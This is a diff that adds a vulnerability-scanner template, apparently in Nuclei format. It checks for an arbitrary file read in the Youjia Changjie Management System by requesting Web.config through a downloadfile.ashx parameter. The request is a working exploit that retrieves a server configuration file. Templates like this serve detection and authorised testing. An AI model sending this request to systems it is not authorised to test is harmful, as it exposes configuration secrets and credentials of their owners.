@@ -1,0 +1,28 @@
+id: poc-youjiasoft-downloadfile-ashx-anyfile-read
+info:
+  name: Youjia Changjie Management System Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/Controllers/ajax/downloadfile.ashx?fileUrl=Web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</system.web>"
+          - "<configuration>"
+      - type: word
+        part: header
+        words:
+          - "filename=Web.config"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
